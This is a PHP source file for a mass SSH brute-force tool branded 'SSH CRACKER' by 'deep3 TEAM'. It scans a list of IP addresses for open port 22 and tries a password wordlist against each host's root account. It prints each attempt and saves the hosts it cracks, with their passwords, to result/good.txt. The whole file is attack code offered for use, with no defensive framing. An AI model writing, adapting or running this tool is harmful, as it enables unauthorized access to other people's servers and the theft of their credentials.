<?php

ini_set("default_socket_timeout", 2);

include 'roote.php';

echo "\n";
echo "\n";
echo "


   __________ __  __     __________  ___   ________ __ __________
  / ___/ ___// / / /    / ____/ __ \/   | / ____/ //_// ____/ __ \
  \__ \\__ \/ /_/ /    / /   / /_/ / /| |/ /   / ,<  / __/ / /_/ /
 ___/ /__/ / __  /    / /___/ _, _/ ___ / /___/ /| |/ /___/ _, _/
/____/____/_/ /_/     \____/_/ |_/_/  |_\____/_/ |_/_____/_/ |_| By deep3 TEAM / created by icodz







";
echo "\n";
echo "\n";


$cfile = "ip.txt";

$file = $cfile;

// Get ip range from list

 foreach(file($file) as $line) {

           $empty = preg_replace('/\s+/', '', $line);

           $connection = @fsockopen($empty, "22");


           if (is_resource($connection))

    {


           echo "\n";

           echo " [+] Target == >[ " . $empty ."] " ."\n";


             foreach(file('inc/pass.txt') as $pass) {

             $empty_pass = preg_replace('/\s+/', '', $pass);

             if (check($empty,'root',$empty_pass) == "BAD") {

                 echo "\n";

                 echo " Testing Password :  " .$empty_pass . " == BAD PASSWORD " . "\n" ."\n" ;

             } else {

                 echo "\n";
                 echo "---------------------------------------------";
                 echo  "\n";
                 echo  "\n";
                 echo " ==> PASSWORD FOUND :D [ ".$empty_pass." ] <== " ."\n"."\n" ;
                 echo "----------------------------------------------";
                 echo "\n";

               $file = 'result/good.txt';

               $current = file_get_contents($file);

               $current .= $empty . " ==> " .$empty_pass. "\n";

               file_put_contents($file, $current);

               continue 2;


             }

    }

}else {

    echo "\n";

    echo "  " . $empty . "  ==>SSH  Port is closed";

    echo "\n";
}

    }